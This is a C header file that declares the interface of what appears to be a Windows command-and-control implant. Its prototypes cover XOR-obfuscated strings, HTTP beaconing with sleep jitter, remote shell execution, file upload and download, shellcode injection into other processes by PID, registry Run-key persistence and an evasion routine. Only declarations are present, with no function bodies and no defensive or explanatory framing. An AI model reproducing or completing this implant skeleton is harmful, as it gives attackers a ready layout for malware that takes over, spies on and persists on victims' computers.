#pragma once

#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "config.h"

typedef struct {
    char id[64];
    char cmd[32];
    char arg[4096];
    char task_id[64];
} task_t;

void xor_decode(char *s);
char *json_get_string(const char *json, const char *key, char *out, size_t out_sz);
int json_get_int(const char *json, const char *key, int def);
int base64_encode(const unsigned char *in, size_t in_len, char *out, size_t out_sz);
int base64_decode(const char *in, unsigned char *out, size_t out_sz, size_t *written);
int http_post_json(const char *path, const char *json_body, char *resp, size_t resp_sz);
void sleep_jitter(void);
void agent_id_init(char *id, size_t sz);
int run_shell(const char *cmd, char *out, size_t out_sz, int *exit_code);
int file_download(const char *path, char *b64_out, size_t b64_sz);
int file_upload(const char *path, const char *b64_data);
int inject_pid(DWORD pid, const unsigned char *shellcode, size_t sc_len);
int persist_runkey(const char *name, const char *exe_path);
void evasion_apply(void);
int inject_self_test(void);
